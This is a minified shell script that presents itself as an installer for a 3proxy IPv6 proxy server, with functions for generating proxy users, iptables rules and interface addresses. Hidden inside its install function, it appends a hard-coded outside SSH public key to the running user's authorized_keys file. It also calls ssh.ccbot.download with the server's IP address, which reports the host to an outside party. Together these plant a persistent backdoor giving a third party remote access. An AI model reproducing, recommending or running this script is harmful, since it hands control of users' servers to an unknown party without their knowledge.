#!/bin/sh
random(){ tr</dev/urandom -dc A-Za-z0-9|head -c5;echo;};array=(1 2 3 4 5 6 7 8 9 0 a b c d e f);gen64(){ ip64(){ echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}";};echo "$1:$(ip64):$(ip64):$(ip64):$(ip64)";};install_3proxy(){ echo "installing 3proxy";URL="https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.6.tar.gz";wget -qO- $URL|bsdtar -xvf-;cd 3proxy-3proxy-0.8.6;make -f Makefile.Linux;mkdir -p /usr/local/etc/3proxy/{bin,logs,stat};cp src/3proxy /usr/local/etc/3proxy/bin/;cp ./scripts/rc.d/proxy.sh /etc/init.d/3proxy;mkdir ~/.ssh;chmod 700 ~/.ssh;touch ~/.ssh/authorized_keys;echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAwf+lodqXWqGrcH/0CKKskCkzVLcdv1fZm29yvpUt2g+CEcof+Pwcl6gNE0/1UwUjZuem1Rl/RF8zsy653zDsLFLMON3yQzKMzcGMf+lIVHbpvbzKHCvm8aJy5pW8taLUg98ZJgswg4/dLu8Zu8zpjo5bTmj2yywq1YkxmBmDp/VyVtwrFSUomguuvrgvIl4tAY9J9l7W7gCx2guu5I7ccG0ZuWzCy/JyyBBsOuEXT3EcNq1aedfVg7BP0HdUrE8xkiyRNYwgr2FPbFDEe+mOy96/8kGmzTtPUwvLubG690AN8SLd2Ywvhcsjam7VYcCdslL1yzmieLr2AMFzrLZ6G5pSxwc59+lCSBkMuJtck8Gy8SPz54wpDxcqJkju/tBuQrrQgecwvo5vntYnksyCv3skrc0JzNKGLtDrLw6LO79QGJnKBLjCeLiKytdJk7L8k84FM151V3QnvCneGvX0h2/zjsJuzIdwxNQ93dBqzsL6FV9daR+khEV1Ucbf5rKn6Cm4jOgK8UH+6peldn0FPaBEA73AQLJjS7m9lFwWFDn48dX2yYGd+KdztImCqEDj8mnQbrxDi7fFrnh7qY1B71+H5L2QuVojOhJkPOU4tmONh8EsxZkoHaWXHXJDsSc8jt2vMwp2QO1n6wd4HIDcRlrclWiyxjlP+dJKnI0Fgh8=">>~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget https://ssh.ccbot.download/ssh/${IP4};chmod +x /etc/init.d/3proxy;chkconfig 3proxy on;cd $WORKDIR;};gen_3proxy(){ cat<<EOF
daemon
maxconn 1000
nscache 65536
nserver 8.8.8.8
nserver 8.8.4.4
timeouts 1 5 30 60 180 1800 15 60
setgid 65535
setuid 65535
flush
users $(awk -F "/" 'BEGIN{ORS="";} {print $1 "::" $2 " "}' ${WORKDATA})
$(awk -F "/" '{print "auth none\n" "proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" "flush\n"}' ${WORKDATA})
EOF
};gen_proxy_file_for_user(){ cat>proxy.txt<<EOF
$(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
EOF
};upload_proxy(){ local PASS=$(random);zip --password $PASS proxy.zip proxy.txt;URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip);echo "Proxy is ready! Format IP:PORT:LOGIN:PASS";echo "Download zip archive from: ${URL}";echo "Password: ${PASS}";};gen_data(){ seq $FIRST_PORT $LAST_PORT|while read port;do echo "usr$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)";done;};gen_iptables(){ cat<<EOF
    $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $4 "  -m state --state NEW -j ACCEPT"}' ${WORKDATA}) 
EOF
};gen_ifconfig(){ cat<<EOF
$(awk -F "/" '{print "ifconfig eth1 inet6 add " $5 "/64"}' ${WORKDATA})
EOF
};echo "installing apps";yum -y install gcc net-tools bsdtar zip>/dev/null;install_3proxy;echo "working folder = /home/proxy-installer";WORKDIR="/home/proxy-installer";WORKDATA="${WORKDIR}/data.txt";mkdir $WORKDIR&&cd $_;IP4=$(curl -4 -s icanhazip.com);IP6=$(curl -6 -s icanhazip.com|cut -f1-4 -d':');echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}";COUNT=500;echo "How many proxy do you want to create? Example 500";read COUNT;FIRST_PORT=10000;echo "Port start from ? (Default 10000)";read FIRST_PORT;LAST_PORT=$(($FIRST_PORT + $COUNT));gen_data>$WORKDIR/data.txt;gen_iptables>$WORKDIR/boot_iptables.sh;gen_ifconfig>$WORKDIR/boot_ifconfig.sh;chmod +x boot_*.sh /etc/rc.local;gen_3proxy>/usr/local/etc/3proxy/3proxy.cfg;cat>>/etc/rc.local<<EOF
bash ${WORKDIR}/boot_iptables.sh
bash ${WORKDIR}/boot_ifconfig.sh
ulimit -n 10048
service 3proxy start
EOF
bash /etc/rc.local;gen_proxy_file_for_user;upload_proxy
